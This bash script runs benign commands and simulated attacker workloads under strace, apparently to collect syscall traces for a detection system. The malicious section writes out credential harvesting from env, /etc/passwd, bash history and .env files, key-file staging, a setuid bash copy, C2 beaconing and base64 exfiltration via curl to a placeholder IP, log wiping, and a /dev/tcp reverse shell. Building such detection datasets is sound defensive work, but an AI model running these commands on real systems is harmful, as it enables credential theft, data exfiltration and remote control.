#!/bin/bash
# Usage: run_workload.sh <workload_name> <output_dir>
WORKLOAD=${1:-"benign_curl"}
OUTDIR=${2:-"/data"}
ARCH=$(uname -m)
OUTFILE="$OUTDIR/${WORKLOAD}_${ARCH}.strace"

mkdir -p "$OUTDIR"

echo "[archprobe] running: $WORKLOAD on $ARCH"
echo "[archprobe] output:  $OUTFILE"

case "$WORKLOAD" in

  # ── BENIGN WORKLOADS ──────────────────────────────────────────────────────
  benign_curl)
    strace -f -e trace=all -o "$OUTFILE" \
      curl -s http://example.com -o /dev/null ;;

  benign_wget)
    strace -f -e trace=all -o "$OUTFILE" \
      wget -q http://example.com -O /dev/null ;;

  benign_git)
    strace -f -e trace=all -o "$OUTFILE" \
      git ls-remote https://github.com/torvalds/linux HEAD ;;

  benign_python)
    strace -f -e trace=all -o "$OUTFILE" \
      python3 -c "import os,sys; [os.getpid() for _ in range(1000)]" ;;

  benign_file_io)
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "dd if=/dev/urandom bs=1M count=5 of=/tmp/test.bin 2>/dev/null && md5sum /tmp/test.bin && rm /tmp/test.bin" ;;

  benign_dns)
    strace -f -e trace=all -o "$OUTFILE" \
      python3 -c "import socket; [socket.gethostbyname('google.com') for _ in range(20)]" ;;

  benign_fork)
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "for i in \$(seq 1 50); do echo \$i & done; wait" ;;

  benign_ssh_keygen)
    strace -f -e trace=all -o "$OUTFILE" \
      ssh-keygen -t ed25519 -f /tmp/test_key -N "" -q && rm -f /tmp/test_key /tmp/test_key.pub ;;

  benign_find)
    strace -f -e trace=all -o "$OUTFILE" \
      find /usr -name "*.so" -type f 2>/dev/null ;;

  benign_proc_enum)
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "ls /proc/ | grep -E '^[0-9]+' | head -50 | xargs -I{} cat /proc/{}/status 2>/dev/null" ;;

  # ── MALICIOUS-PATTERN WORKLOADS ───────────────────────────────────────────
  # These simulate attacker behavior patterns without actual harm.
  # All run inside an isolated container — no real targets.

  mal_recon_net)
    # Simulates rapid port scanning behavior (loopback only)
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "for port in \$(seq 20 1024); do (echo >/dev/tcp/127.0.0.1/\$port) 2>/dev/null && echo open:\$port; done" ;;

  mal_recon_proc)
    # Simulates process enumeration (common post-exploitation step)
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "ps aux; cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '; ls -la /proc/*/exe 2>/dev/null" ;;

  mal_file_staging)
    # Simulates data staging: find sensitive filenames, copy them
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "find / -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null | head -30 | xargs -I{} cp {} /tmp/ 2>/dev/null" ;;

  mal_cred_harvest)
    # Simulates credential harvesting: read env, history, shadow-like files
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "env; cat /etc/passwd; cat /root/.bash_history 2>/dev/null; find / -name '.env' 2>/dev/null | xargs cat 2>/dev/null" ;;

  mal_persistence)
    # Simulates persistence: write to cron, rc files, systemd
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "echo '* * * * * /tmp/backdoor' >> /tmp/fake_cron; cp /bin/bash /tmp/.hidden_bash; chmod +s /tmp/.hidden_bash 2>/dev/null; mkdir -p ~/.config/autostart" ;;

  mal_c2_beacon)
    # Simulates C2 beaconing: periodic outbound connections to fixed host
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "for i in \$(seq 1 10); do curl -s --connect-timeout 1 http://192.0.2.1/beacon?id=abc123 -o /dev/null 2>/dev/null; sleep 0.5; done" ;;

  mal_exfil)
    # Simulates data exfiltration: base64 encode + send
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "tar czf - /etc/passwd /etc/hostname 2>/dev/null | base64 | curl -s --connect-timeout 1 -X POST -d @- http://192.0.2.1/upload 2>/dev/null" ;;

  mal_privesc_enum)
    # Simulates privilege escalation enumeration
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "id; whoami; sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null" ;;

  mal_log_wipe)
    # Simulates log tampering
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "cat /dev/null > /tmp/fake.log; truncate -s 0 /tmp/fake2.log; find /tmp -name '*.log' -exec truncate -s 0 {} \;" ;;

  mal_reverse_shell_sim)
    # Simulates reverse shell setup (connects to loopback only — safe)
    strace -f -e trace=all -o "$OUTFILE" \
      bash -c "bash -i >& /dev/tcp/127.0.0.1/9999 0>&1 &sleep 1; kill %1 2>/dev/null" ;;

  *)
    echo "[archprobe] unknown workload: $WORKLOAD"
    exit 1 ;;
esac

echo "[archprobe] done → $OUTFILE"
